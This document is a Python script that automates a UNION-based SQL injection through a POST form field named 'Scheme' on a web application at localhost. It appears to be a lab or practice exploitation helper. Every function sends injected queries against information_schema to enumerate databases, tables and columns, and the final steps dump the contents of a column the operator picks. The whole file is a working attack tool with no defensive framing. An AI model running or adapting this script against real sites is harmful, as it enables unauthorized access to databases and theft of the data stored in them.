import requests
import bs4

def get_databases_count():
   data = {"Scheme": "2' and 0 union select 1,count(schema_name),3,4 from information_schema.schemata limit 0,1-- -", "Others_Scheme": ""}
   response = requests.post("http://localhost", data=data)
   soup = bs4.BeautifulSoup(response.text , "html.parser")
   db_count = soup.find('td').text
   return int(db_count[6:])


def get_table_count():
   data = {"Scheme": "2' and 0 union select 1,count(table_name),3,4 from information_schema.tables where table_schema= '"+db_name+"'  limit 0,1-- -", "Others_Scheme": ""}
   response = requests.post("http://localhost", data=data)
   soup = bs4.BeautifulSoup(response.text , "html.parser")
   table_count = soup.find('td').text
   return int(table_count[6:])

def get_table_name():
   tables = []
   for i in range(0,get_table_count()):
     data = {"Scheme": "2' and 0 union select 1,table_name,3,4 from information_schema.tables where table_schema='"+db_name+"' limit "+str(i)+",1-- -", "Others_Scheme": ""}
     response = requests.post("http://localhost", data=data)
     soup = bs4.BeautifulSoup(response.text , "html.parser")
     table_name = soup.find('td').text
     tables.append(table_name[6:])
   return (tables)

def get_column_count():
   data = {"Scheme": "2' and 0 union select 1,count(column_name),3,4 from information_schema.columns where table_schema= '"+db_name+"' and table_name='"+tbl_name+"'  limit 0,1-- -", "Others_Scheme": ""}
   response = requests.post("http://localhost", data=data)
   soup = bs4.BeautifulSoup(response.text , "html.parser")
   table_count = soup.find('td').text
   return int(table_count[6:])

def get_column_name():
   columns = []
   for i in range(0,get_column_count()):
     data = {"Scheme": "2' and 0 union select 1,column_name,3,4 from information_schema.columns where table_schema='"+db_name+"' and table_name='"+tbl_name+"' limit "+str(i)+",1-- -", "Others_Scheme": ""}
     response = requests.post("http://localhost", data=data)
     soup = bs4.BeautifulSoup(response.text , "html.parser")
     column_name = soup.find('td').text
     columns.append(column_name[6:])
   return (columns)

def get_data_count():
   data = {"Scheme": "2' and 0 union select 1,count("+column_name+"),3,4 from "+tbl_name+" limit 0,1-- -", "Others_Scheme": ""}
   response = requests.post("http://localhost", data=data)
   soup = bs4.BeautifulSoup(response.text , "html.parser")
   data_count = soup.find('td').text
   return int(data_count[6:])

def get_data_name():
   datas = []
   for i in range(0,get_data_count()):
     data = {"Scheme": "2' and 0 union select 1,"+column_name+",3,4 from "+tbl_name+" limit "+str(i)+",1-- -", "Others_Scheme": ""}
     response = requests.post("http://localhost", data=data)
     soup = bs4.BeautifulSoup(response.text , "html.parser")
     data_name = soup.find('td').text
     datas.append(data_name[6:])
   return (datas)
   
def databases_name():
  info = []

  for x in range(0,get_databases_count()):
   data = {"Scheme": "2' and 0 union select 1,schema_name,3,4 from information_schema.schemata limit "+str(x)+",1-- -", "Others_Scheme": ""}
   info.append(data)

  for y in range(1,get_databases_count()):   
   response = requests.post("http://localhost", data=info[y])
   soup = bs4.BeautifulSoup(response.text , "html.parser")
   data = soup.find('td').text
   print(data[6:])

   
print(databases_name())

db_name = input("DATABASE NAME :")

print(get_table_name())
tbl_name = input("TABLE NAME:")

print(get_column_name())
column_name = input("COLUMN NAME:")

print(get_data_name())
